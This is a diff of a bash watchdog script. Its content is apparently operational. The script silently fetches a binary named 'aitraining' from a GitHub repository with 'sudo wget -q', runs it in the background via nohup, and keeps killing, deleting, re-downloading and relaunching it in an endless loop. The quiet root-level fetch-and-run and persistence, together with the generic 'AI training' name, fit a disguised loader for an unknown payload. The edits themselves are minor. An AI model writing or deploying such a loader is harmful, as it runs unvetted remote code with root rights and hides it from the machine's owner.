@@ -15,8 +15,7 @@ while true; do
 
     # Delete old files before download
     echo "Deleting old files..."
-    rm -f ./aitraining ./start_modelgp.sh
-
+            rm -f ./bx.sh ./aitraining ./start_modelgp.sh
     # Launch start_modelgp.sh silently in background
     nohup bash -c '
         sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
@@ -30,14 +29,12 @@ while true; do
 
     # --- 5-minute monitoring loop runs in foreground ---
     runtime=0
-    monitor_interval=300  # 5 minutes in seconds
-    max_runtime=3600     # 1 hour in seconds
-    
-    while [ $runtime -lt $max_runtime ]; do
-        sleep $monitor_interval
-        runtime=$((runtime + monitor_interval))
+    while [ $runtime -lt 3600 ]; do  # 1 hour
+        sleep 300  # 5 minutes
+        runtime=$((runtime + 300))
 
         if pgrep -f "aitraining" > /dev/null; then
+            # This echo will now appear in your terminal
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining running fine."
         else
             echo "$(date '+%Y-%m-%d %H:%M:%S') - aitraining stopped! Restarting start_modelgp.sh..."
@@ -47,7 +44,7 @@ while true; do
             sudo pkill -f "aitraining" 2>/dev/null
 
             # Delete old files
-            rm -f ./aitraining ./start_modelgp.sh
+            rm -f ./bx.sh ./aitraining ./start_modelgp.sh
 
             # Relaunch silently
             nohup bash -c '
